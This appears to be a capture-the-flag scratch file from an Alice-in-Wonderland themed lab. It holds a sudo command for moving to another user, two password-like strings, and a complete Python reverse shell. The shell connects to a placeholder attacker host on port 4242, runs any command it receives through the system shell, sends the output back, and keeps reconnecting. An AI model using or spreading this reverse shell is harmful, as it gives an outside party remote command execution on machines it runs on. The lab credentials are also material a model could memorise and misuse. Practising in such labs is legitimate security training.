
# Set the host and the port.
HOST = "IP"
PORT = 4242
sudo -u rabbit python3.6 /home/alice/walrus_and_the_carpenter.py
HowDothTheLittleCrocodileImproveHisShiningTail
WhyIsARavenLikeAWritingDesk?
def connect(host, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        return s

def wait_for_command(s):
        data = s.recv(1024)
        if data == "quit\n":
                s.close()
                sys.exit(0)
        # the socket died
        elif len(data)==0:
                return True
        else:
                # do shell command
                proc = subprocess.Popen(data, shell=True,
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE)
                stdout_value = proc.stdout.read() + proc.stderr.read()
                s.send(stdout_value)
                return False

def main():
        while True:
                socket_died=False
                try:
                        s=connect(HOST,PORT)
                        while not socket_died:
                                socket_died=wait_for_command(s)
                        s.close()
                except socket.error:
                        pass
                time.sleep(5)

if __name__ == "__main__":
        import sys,os,subprocess,socket,time
        sys.exit(main())
